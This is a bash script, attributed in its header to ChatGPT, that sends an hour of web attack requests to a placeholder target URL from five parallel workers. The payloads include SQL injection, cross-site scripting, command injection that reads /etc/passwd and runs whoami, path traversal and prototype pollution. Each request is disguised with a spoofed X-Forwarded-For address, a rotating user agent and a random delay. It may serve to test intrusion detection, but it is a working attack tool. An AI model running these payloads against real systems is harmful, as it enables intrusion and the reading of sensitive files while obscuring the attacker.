# This script was created by Chat GPT :)

#!/bin/bash

# === Config ===
BASE_URL="http://change-to-targeted-url"
DELAYS=(0.25 0.5 1 2 3 5)
XFF_IPS=(
  23.14.89.201
  34.110.174.22
  45.33.32.156
  52.15.72.219
  54.241.24.25
  63.142.250.198
  66.165.240.10
  68.183.44.42
  69.89.31.226
  74.125.136.113
  76.76.21.21
  81.169.145.149
  84.38.184.130
  91.189.91.157
  103.21.244.0
)
USER_AGENTS=(
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/115.0.0.0 Safari/537.36"
  "Mozilla/5.0 (Macintosh; Intel Mac OS X) Safari/605.1.15"
  "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) Firefox/116.0"
  "curl/7.85.0"
  "PostmanRuntime/7.32.0"
)

# === 15 Predefined Attack Paths (GET requests only) ===
ATTACK_PATHS=(
  "/login?username=admin'--"
  "/search?query=' OR '1'='1"
  "/product?id=10 AND 1=1"
  "/order?id=105; DROP TABLE orders;"
  "/auth?user=' OR '1'='1' --"
  "/comment?text=<script>alert('XSS')</script>"
  "/msg?msg=<img src=x onerror=alert('x')>"
  "/profile?bio=<svg/onload=alert('xss')>"
  "/form?input=<iframe src='javascript:alert(1)'>"
  "/ping?host=;cat /etc/passwd"
  "/lookup?ip=127.0.0.1;whoami"
  "/file?name=../../../../etc/passwd"
  "/docs?doc=..%2F..%2F..%2Fsecret.txt"
  "/data?blob=%7B%22__proto__%22%3A%7B%22polluted%22%3Atrue%7D%7D"
  "/conf?config={\"__proto__\":{\"admin\":true}}"
)

# === Worker Function ===
traffic_worker() {
  local END_TIME=$(( $(date +%s) + 3600 ))
  
  while [ $(date +%s) -lt $END_TIME ]; do
    path=${ATTACK_PATHS[$((RANDOM % ${#ATTACK_PATHS[@]}))]}
    url="${BASE_URL}${path}"
    xff=${XFF_IPS[$((RANDOM % ${#XFF_IPS[@]}))]}
    ua=${USER_AGENTS[$((RANDOM % ${#USER_AGENTS[@]}))]}
    delay=${DELAYS[$((RANDOM % ${#DELAYS[@]}))]}

    echo "[$(date '+%T')] -> $url"
    
    curl -s -X GET "$url" \
      -H "X-Forwarded-For: $xff" \
      -H "User-Agent: $ua" \
      -o /dev/null

    sleep "$delay"
  done
}

# === Start 5 Workers ===
for i in {1..5}; do
  traffic_worker &
done

wait
echo "All workers finished after 1 hour."
